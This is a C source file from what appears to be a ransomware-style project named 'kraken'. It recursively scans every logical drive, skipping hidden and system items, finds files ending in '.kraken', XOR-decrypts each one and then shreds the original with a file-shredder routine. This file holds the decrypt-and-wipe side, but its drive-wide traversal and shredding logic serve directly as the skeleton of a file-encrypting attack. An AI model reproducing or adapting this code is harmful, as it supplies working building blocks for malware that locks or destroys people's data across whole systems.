/*
* MIT License
*
* Copyright (c) 2022 kadzicu
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "SearchEngineClass.h"

search_engine_class_t* search_engine_class_create()
{
    search_engine_class_t* search_engine_class_obj = (search_engine_class_t*)malloc(sizeof(search_engine_class_t));
    if (search_engine_class_obj)
    {
        search_engine_class_obj->impl_ = malloc(sizeof(search_engine_class_variables_t));
        if (search_engine_class_obj->impl_)
        {
            search_engine_class_obj->method = (search_engine_class_methods_t*)malloc(sizeof(search_engine_class_methods_t));
            if (search_engine_class_obj->method)
            {
                search_engine_class_t* res = search_engine_class_init(search_engine_class_obj);
                if (res)
                    return res;
                else
                {
                    free(search_engine_class_obj->method);
                    free(search_engine_class_obj->impl_);
                    free(search_engine_class_obj);
                    return NULL;
                }
            }
            else
            {
                free(search_engine_class_obj->impl_);
                free(search_engine_class_obj);
                return NULL;
            }
        }
        else
        {
            free(search_engine_class_obj);
            return NULL;
        }
    }
    else
        return NULL;
}

static search_engine_class_t* search_engine_class_init(search_engine_class_t* this)
{
    this->method->se_destroy = se_destroy;
    this->method->se_start = se_start;

    search_engine_class_variables_t* var = (search_engine_class_variables_t*)this->impl_;
    var->FileExt = _T("kraken");

    return this;
}

static void search_engine_class_destroy(search_engine_class_t* this) 
{
    if (this)
    {
        if (this->impl_)
            free(this->impl_);
        if (this->method)
            free(this->method);
        free(this);
    }
}

static void search_engine_class_start(
        search_engine_class_t* this,
        LPCTSTR currentLogicalDrive
    )
{
    _TCHAR currentPath[MAX_PATH + 0x01];
    _tcscpy_s(currentPath, _countof(currentPath), currentLogicalDrive);
    _tcscat_s(currentPath, _countof(currentPath), _T("\\"));

    _TCHAR findParam[MAX_PATH + 0x01];
    _tcscpy_s(findParam, _countof(findParam), currentPath);
    _tcscat_s(findParam, _countof(findParam), _T("*"));

    HANDLE hFind;
    WIN32_FIND_DATA findData;

    search_engine_class_variables_t* var = (search_engine_class_variables_t*)this->impl_;

    if ((hFind = FindFirstFile(findParam, &findData)) != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!lstrcmp(findData.cFileName, _T(".")) ||
                !lstrcmp(findData.cFileName, _T("..")) ||
                findData.cFileName[0x00] == _T('.'))
                continue;

            _TCHAR currentFile[MAX_PATH + 0x01];
            _tcscpy_s(currentFile, _countof(currentFile), currentPath);
            _tcscat_s(currentFile, _countof(currentFile), findData.cFileName);

            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                _TCHAR* currentFileExt = PathFindExtension(
                    currentFile
                ) + 0x01;

                if (!lstrcmpi(currentFileExt, var->FileExt))
                {
                    xor_class_t* xor_class_obj = xor_class_create(currentFile);
                    if (xor_class_obj)
                    {
                        xor_class_obj->method->xor_decrypt(xor_class_obj);
                        xor_class_obj->method->xor_destroy(xor_class_obj);
                    }

                    file_shredder_class_t* file_shredder_class_obj = file_shredder_class_create(currentFile);
                    if (file_shredder_class_obj)
                    {
                        file_shredder_class_obj->method->fs_start(file_shredder_class_obj);
                        file_shredder_class_obj->method->fs_destroy(file_shredder_class_obj);
                    }
                }
            }

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)) 
            {
                search_engine_class_start(this, currentFile);
            }
        } while (FindNextFile(hFind, &findData));

        FindClose(hFind);
    }
}

static void se_destroy(search_engine_class_t* this)
{
    search_engine_class_destroy(this);
}

static void se_start(search_engine_class_t* this)
{
    logical_drive_class_t* logical_drive_class_obj = logical_drive_class_create();
    if (logical_drive_class_obj)
    {
        int number_of_logical_drives = logical_drive_class_obj->method->get_var_number_of_logical_drives(logical_drive_class_obj);
        _TCHAR** list_of_logical_drives = logical_drive_class_obj->method->get_var_list_of_logical_drives(logical_drive_class_obj);

        for (size_t i = 0; i < number_of_logical_drives; i++)
            search_engine_class_start(this, list_of_logical_drives[i]);

        logical_drive_class_obj->method->ld_destroy(logical_drive_class_obj);
    }
}
